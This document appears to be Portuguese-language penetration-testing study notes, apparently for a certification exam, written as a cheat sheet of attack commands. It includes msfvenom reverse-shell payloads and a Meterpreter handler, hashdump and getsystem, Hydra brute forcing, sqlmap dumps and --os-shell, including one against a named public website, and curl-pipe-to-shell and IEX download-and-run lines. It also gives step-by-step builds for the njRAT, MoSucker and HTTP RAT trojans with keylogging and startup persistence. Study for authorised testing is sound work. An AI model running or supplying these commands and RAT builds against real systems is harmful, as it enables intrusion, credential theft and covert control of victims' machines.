
# Itens importantes

- CMS Wordpress, Joomla, Drupal
- Filtros Wireshark
- Quebra de 4WHS Wireless
- Quebra LLMNR
- OpenStego
- Steghide
- Stegnohide
- Escalação com NFS

## Ataques
sqlinjection
https://academy.hackthebox.com/module/details/33


## Possíveis Vulnerabilidades

IDOR
https://academy.hackthebox.com/module/134/section/1179

CSRF
https://academy.hackthebox.com/module/details/145

## Aplicações Vulneráveis

COURSE ATTACKING COMMON APPLICATIONS
https://academy.hackthebox.com/module/113/section/1089

COURSE ATTACKING ENTERPRISE NETWORKS
https://academy.hackthebox.com/module/163/section/1544



## CMS



DVWA - 2 Desafios
Se cair DVWA, eu devo ir em DVWA Security e colocar em Low para diminuir o nível de segurança.


___
___
# NOTAS DE ESTUDO
___
___

## SCANNING

sudo arp-scan -local
netdiscover -i 192.150.16.0
nmap -sn ip/24


**ARP Scan**
sudo arpscan --local

**Arp sweep**
nmap -sn -PR 10.10.1.0/24

**Ping Sweep**
Comando: `nmap -sn -PE 10.10.1.0/24`

Comando: `for ip in {2..254}; do (ping -c 1 192.168.200.${ip} | grep "bytes from" &);done`

`nmap -Pn -p88 -sV -O 192.168.2.37`

nmap -Pn -sS -T5  -p-

nmap -Pn -sS -T5 -p389

nmap -Pn -p80

nmap -sV -A -p80

nmap -sVC -A -p- -T5

nmap -Pn -sS -sV -p- -iL hosts

**Separando somente os endereços IP**

Comando: `grep "Up" ativos.txt | cut -d " " -f 2 > hosts`

**Encontrando alvos com porta 80**

Comando: `nmap -sSV -p 80 --open -Pn -iL hosts -oG web.txt`

**Scan Completo**

`nmap -Pn -sC -sV -p- -iL enum/alvos.txt -oA servicos/full`

nmap --script smb-os-discovery.nse -p445 192.168.10.35


## SYSTEM HACKING

### Compilando binários

**Compilando em 32 bits**

Comando: `apt-get update`

Comando: `apt-get install gcc-multilib g++-multilib`

**Melhorando a shell**

python -c 'import pty;pty.spawn("/bin/bash");'

### Ataques a Senhas

**Descompactando a wordlist rockyou.txt**

Comando: `gunzip /usr/share/wordlists/rockyou.txt.gz`

**Gerando senhas a partir do site**

Comando: `cewl -d 2 -m 5 www.certifiedhacker.com -u "Firefox 5.1" -w /tmp/dicionario.txt`

cewl -d -w save_wordlist.txt 2 -m 5 www.example.com


**Arquivos de log do John**
/usr/share/responder/logs

**Wordlist padrão do John**
/usr/share/john/passwd.lst

**SecLists**
https://github.com/danielmiessler/SecLists

**Quebrando a hash**
ent arquivo

Comando: `john SMB-NTLMv2-SSP-10.10.1.11.txt --wordlist /usr/share/wordlists/rockyou.txt`

**Calculando a entropia**
ent arquivo

**Bruteforce em protocolos**

Commando: `hydra -L users.txt -p Password ssh://192.168.200.1`

**Bruteforce em campos de login**

Command: `hydra -v -L users.tt -P pass.txt 192.168.200.1 http-post-form "/diretorio/login.php:login=ÛSER^&senha=^PASS^&Login:incorreto`


### Enumeração

**DNS**
Comando: `host -l <dns> <dns>`

**SNMP**
locate *.nse | grep snmp

nmap -sU -p 161 192.168.10.103 --scrip=snmp-win32-shares.nse

nmap -sU -p 161 192.168.10.103 --script=snmp-win32-users.nse

snmp-check 192.168.10.103

**NFS**

showmount -e 192.168.10.159

mount -t nfs 192.168.10.159:/home/vulnix /tmp/eder cd /tmp/eder

**FTP**
nmap -sV -p 21 192.168.10.0/24 --=ftp-anon.nse

**SIP**
apt-get install sip-vicious
svmap 192.168.10.0/24

**SMB**
nmap -sU -p 161 192.168.10.103 --script=snmp-win32-users.nse

nbtscan -r 192.168.10.0/24

crackmapexec smb ip/24

**HTTP/HTTPS**
wafw00f

curl --head www.smaff.com.br

whatweb www.smaff.com.br

nmap -sV --script=http-enum

```
nikto -h 192.168.10.107


nikto -h www.google.com -Tuning x
nikto -h www.google.com -Cgidirs all
nikto -h www.google.com -o nikto_scan_results -F txt
```



**Criando Payloads com o Msfvenom**

msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.2 lport=4321 --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" -f exe -o meumalvadofavorito.exe

msfvenom -p cmd/unix/reverse_netcat LHOST=ip LPORT=4244

**Colocando a máquina para escutar**

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp

set lhost 10.10.10.2

set lport 4321

exploit

**Verificando os privilégios de usuário**
getuid

**Escalando privilégios**
getsystem

**Realizando o dump de hashs de senhas**
hashdump

**Verificando os processos**
ps


**LinPEAS**

https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
Comando: `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`

**WinPEAS**

Comando: `powershell "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"`

## Exploração

**Montando diretórios NFS**

Comando: `mount -t nfs -o vers=3 192.168.200.124:/var/nfs/general /mnt`

## Pós Exploração

Pesquisando por arquivos
find . -name nomeArquivo

Verificar informações sobre o sistema
Exibe detalhes do kernel
uname -a

Mostra a versão do sistema operacional
cat /etc/os-release

Mostra a versão do kernel e compiladores
cat /proc/version

#### Verificar permissões de sudo e SUID
**Comandos Sudo**
sudo -l

**Permissões BitSUID**
Comando: `find / -perm -4000 2>/dev/null`

Verificar arquivos com permissões incomuns:
**Arquivos graváveis**
find / -writable -type f 2>/dev/null

**Arquivos executáveis pelo dono**
find / -perm -u+x -type f 2>/dev/null

Verificar processos e serviços rodando como root
**Processos rodando como root**
ps aux | grep root

**Lista todos os processos**
ps -ef


**Verificar tarefas agendadas (cron jobs)**
cat /etc/crontab
ls -la /etc/cron*

**Verificar arquivos graváveis**:

find / -writable -type f -name "*.sh" 2>/dev/null

**Explorar serviços com privilégios elevados**

netstat -tuln

**Verifique serviços de rede rodando**:

netstat -tuln

ss -nlpt

Serviços vulneráveis, como o **NFS**, podem permitir montagem de diretórios como root:

showmount -e localhost

Verificar histórico de comandos

cat ~/.bash_history

**Verificar senhas armazenadas**

Lista de usuários do sistema

cat /etc/passwd

Arquivo de senhas (root necessário)

cat /etc/shadow


Verificar programas de terceiros e pacotes instalados
**Listar pacotes instalados:**
dpkg -l

rpm -qa

**Verificar binários com privilégios elevados:**

which nmap vim gcc perl python ruby find

**Procurar vulnerabilidades no Kernel**

uname -r

**Ferramentas de Enumeração Automáticas**

 wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
 
chmod +x linpeas.sh

./linpeas.sh

**Linux Exploit Suggester**:

wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh

chmod +x linux-exploit-suggester.sh

./linux-exploit-suggester.sh




## ANDROID

## WIRELESS

aircrack-ng WPA2crack-01.cap -w password.txt


Cracking Wifi Password
aircrack-ng -a2 -b [Target BSSID] -w [password_Wordlist.txt] [WP2 PCAP file] (For cracking WPA2 or other networks through the captured .pcap file)

## WEB HACKING

### CMS

Wordpress, Joomla, Drupal

**Droopescan**

https://github.com/SamJoan/droopescan

Comando: `droopescan scan drupal -u http://example.org/ -t 32`

wpscan --url https://example/ --enumerate u

wpscan --url https://example/ --passwords wordlist.txt --usernames samson


**CMSmap**

https://github.com/dionach/CMSmap

cmsmap.py https://example.com

cmsmap.py https://example.com -f W -F --noedb -d

cmsmap.py https://example.com -i targets.txt -o output.txt

cmsmap.py https://example.com -u admin -p passwords.txt

cmsmap.py -k hashes.txt -w passwords.txt

#### Wordpress
https://academy.hackthebox.com/module/17/section/40

#### Drupal

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/drupal/drupal-rce

#### Joomla

https://github.com/OWASP/joomscan

joomscan update

joomscan check

joomscan -u http://www.joomla.org

### Bruteforce

**SSH**

hydra ssh://127.0.0.1:22222 -L /home/wordlist.txt -P wordlist.txt -V

**Form**

`hydra -L [user] -P [password] [IP] http-post-form "/:usernam=^USER^ & password=^PASS^:F=inc`

**SMB**

hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.118 smb

### SQLi

```
1 OR 1 = 1 #A 
1 OR ANY TEXT
```

**Manual SQL Injection**

`in login page enter blah' or 1=1-- as username and click login without entering the password`

**GET access of OS Shell =**

`sqlmap -u 'url' --dbms=mysql --os-shell SQL Shell = sqlmap -u 'url' --dbms=mysql --sql-shell`

sudo sqlmap --update

sqlmap -u "------/id=1" --dbs --batch

sqlmap -u "https://bliss-hotel.000webhostapp.com/room_details.php?room_type_id=RM101" --dbs --batch

sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch

sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --table --batch

sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch

sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump --batch

sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --dump-all --batch

sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --cookie='JSESSIONID=09h76qoWC559GH1K7DSQHx' --random-agent --level=1 --risk=3 --dbs --batch

sqlmap -u http://site/viewprofile.aspx?id=1 --cookie="teste=12wqad..." --bath --dbs


in login page enter blah' or 1=1-- as username and click login without entering the password

sqlmap -u 'url' --dbms=mysql --os-shell SQL Shell = sqlmap -u 'url' --dbms=mysql --sql-shell
   
sqlmap -u “address” --cookie=<”cookie values”> --dbs
  
sqlmap -u “address” --cookie=<”cookie values”> -D --tables
  
sqlmap -u “http://www.demosql.com/viewprofile.aspx?id=1” --cookie=<”cookie values”> -D -T --columns   

sqlmap -u “http://www.demosql.com/viewprofile.aspx?id=1” --cookie=<”cookie values”> -D -T--dump

sqlmap -u “http://www.demosql.com/viewprofile.aspx?id=1” --cookie=<”cookie values”> --os-shell


## Sniffing

**Wireshark Filters**

http.request.method == POST

tcp.flags.syn == 1 , tcp.flags.syn == 1 and tcp.flags.ack == 0

ip.dst==192.168.188

ip.src == 192.168.161.100 && tcp.port == 443

http.request.method == "POST"

ip.src == 145.254.160.237 && ip.dst == 145.253.2.203



## Esteganografia

### Data Stream

Descobrindo nfs data stream
Comando: `dir /r`

**Escondendo a informação**

Comando: `echo "mensagem" > agenda.txt:stream1`

Comando: `more < agenda.txt:stream1`

**Extraindo a informação**

Comando: `more < agenda.txt:stream1`

### Steghide
**Inserindo uma mensagem secreta**

Comando: `steghide embed -ef mensagemsecreta.txt -cf imagem.jpeg -sf imagemstegno.jpeg`

**Extraindo a mensagem**

Comando: `steghide extract -sf imagemstegno.jpeg -xf mensagemdescoberta.txt`

**Stegcracker** - Steghide automatizado que utiliza uma Wordlist
https://github.com/Paradoxis/StegCracker

**Stegseek** é mais rápido que o stegcracker https://github.com/RickdeJager/stegseek

### Snow

**Criando a mensagem**

Comando: `snow.exe -C -p magic -m "Mensagem a ser ocultada" averdade2.txt`

**Extraindo a mensagem**

Comando: `snow.exe -C -p magic arquivo.txt`

### Hashes

**Tirando hash pelo PowerShell**

Comando: `certutil -hashfile arquivo.txt`

**Gerando hash com Get-FileHash**

Comando: `Get-FileHash <Location> -A SHA256 (SHA-1/256/384/512/MD5)`

**Verificando se um arquivo possui determinada hash e realiza a comparação**

 - Retornará verdadeiro ou falso
 
Comando: `(Get-FileHash <Location> -A SHA256 ).hash -eq "<hash value>"`


**hashcalc** - App utilizado para tirar hashs.


**HASHCAT syntax**


Comando: `sudo hashcat -a 0 -m 0 Desktop/h1.txt /usr/share/wordlists/rockyou_fix.txt`

-a 0 is for wordlist
-a 3 is for brut-force

- 0 md5
- 100 SHA1
- 1400 SHA256
- 1700 SHA512
- 900 MD4
- 3200 BCRYPT  

For more reference :- [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)

## Cryptography


Quickstego - Imagens
Openstego - Imagens
https://github.com/syvaidya/openstego/releases


### Indentificando Hashes

Comando: `Hash-identifier`

Comando: `hashid`

**Quebrando hashes**
sudo hashcat -a 0 -m 0 Desktop/h1.txt /usr/share/wordlists/rockyou_fix.txt


**LM**

john --format=LM lm_hashes.txt

john --show lm_hashes.txt

hashcat -m 3000 lm_hashes.txt /path/to/wordlist.txt

hashcat -m 3000 --show lm_hashes.txt


**Linux**

md5sum arquivo

cat arquivo | md5sum

### Veracrypt

VeraCrypt
- select volume
- mount the volume
- dismount the volume

## ANDROID

https://github.com/prbhtkumr/PhoneSploit

Pesquisando por um arquivo

adb shell ls -R | grep filename

adb pull /sdcard/log.txt %USERPROFILE%\Desktop\

nmap ip -sV -p 5555

apt update

apt install adb

adb tcpip 5555

`adb connect <ip-address>:5555`

adb shell

## RAT Tool

### MOSUCKER

- go to file mosuker
- click createserver.exe -> run as admin
- server creator -> click Ok
- save Server.exe -> save
- will generate server
- change victim name -> victim CONNECTION PORT -> 4288
- keylogger -> enable off-line keylogger ->save
- exit
- Open mosucker
- connect
- screen capture - start


### HTTP RAT Tool

- open Http Rat tool
- uncheck notification to the mail option
- set server port number : 84
- create
- server will created in http rat tool folder -> http rat trojan
- when victim runs that, got pwned
- attacker can access files with browser with ip if of victims


###  njRAT Tool

- open njRat v0.7.exe
- check port no : 5552
- click start
- click on Builder
- enter host ip ( attacker ip)
- check checkBox - Copy To startup & Registry startup
- click build

### Entrypoiunt

**Descobrindo o Entry Point do binário no Linux**

readelf -h /bin/bash


